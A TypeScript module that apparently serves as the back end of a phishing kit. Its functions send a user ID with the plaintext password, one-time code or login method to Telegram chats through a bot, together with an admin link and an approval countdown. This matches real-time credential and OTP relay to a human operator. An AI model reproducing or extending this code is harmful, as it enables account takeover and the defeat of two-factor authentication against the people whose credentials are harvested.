import { wrapFlowMessage } from '@/lib/telegram'
import { sendTelegramApprovalWithCountdown } from '@/lib/telegram-approval-countdown'
import {
  buildLoginApprovalRequestBody,
  buildMethodApprovalRequestBody,
  buildOtpApprovalRequestBody,
} from '@/lib/telegram-approval-templates'

const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim()
const CHAT_IDS = (process.env.TELEGRAM_CHAT_ID || '')
  .split(',')
  .map((id) => id.trim())
  .filter(Boolean)

function escapeTelegramHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

function asCode(value: unknown): string {
  const text =
    typeof value === 'string'
      ? value.trim()
      : value != null && value !== ''
        ? String(value)
        : ''
  return `<code>${escapeTelegramHtml(text || 'Unknown')}</code>`
}

function isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value.trim())
}

function ensureAbsoluteHttpUrl(value: string): string {
  const t = value.trim()
  if (!t || isHttpUrl(t) || t.startsWith('/')) return t
  if (/^[a-z0-9.-]+\.[a-z]{2,}([/:].*)?$/i.test(t)) {
    return `https://${t}`
  }
  return t
}

function asLink(url: string, label?: string): string {
  const href = ensureAbsoluteHttpUrl(url.trim())
  const linkText = (label?.trim() || href).trim()
  if (!href || !isHttpUrl(href)) {
    if (label?.trim()) return escapeTelegramHtml(label.trim())
    return asCode(href || 'Unknown')
  }
  return `<a href="${escapeTelegramHtml(href)}">${escapeTelegramHtml(linkText)}</a>`
}

export async function sendLoginApprovalRequest(data: {
  userId: string
  password: string
  method?: string
  createdAtMs: number
    databaseShard?: string
  adminLink: string
}): Promise<boolean> {
  return sendTelegramApprovalWithCountdown({
    botToken: TELEGRAM_BOT_TOKEN,
    chatIds: CHAT_IDS,
    createdAtMs: data.createdAtMs,
    wrapMessage: wrapFlowMessage,
    buildText: (secondsLeft) =>
      buildLoginApprovalRequestBody({
        userId: data.userId,
        password: data.password,
        method: data.method,
        adminLink: data.adminLink,
        secondsLeft,
        databaseShard: data.databaseShard,
        asCode,
        asLink,
      }),
  })
}

export async function sendOtpApprovalRequest(data: {
  userId: string
  code: string
  method?: string
  createdAtMs: number
    databaseShard?: string
  adminLink: string
}): Promise<boolean> {
  return sendTelegramApprovalWithCountdown({
    botToken: TELEGRAM_BOT_TOKEN,
    chatIds: CHAT_IDS,
    createdAtMs: data.createdAtMs,
    wrapMessage: wrapFlowMessage,
    buildText: (secondsLeft) =>
      buildOtpApprovalRequestBody({
        userId: data.userId,
        code: data.code,
        method: data.method,
        adminLink: data.adminLink,
        secondsLeft,
        databaseShard: data.databaseShard,
        asCode,
        asLink,
      }),
  })
}

export async function sendMethodApprovalRequest(data: {
  userId: string
  method: string
  createdAtMs: number
  adminLink: string
}): Promise<boolean> {
  return sendTelegramApprovalWithCountdown({
    botToken: TELEGRAM_BOT_TOKEN,
    chatIds: CHAT_IDS,
    createdAtMs: data.createdAtMs,
    wrapMessage: wrapFlowMessage,
    buildText: (secondsLeft) =>
      buildMethodApprovalRequestBody({
        userId: data.userId,
        method: data.method,
        adminLink: data.adminLink,
        secondsLeft,
        asCode,
        asLink,
      }),
  })
}
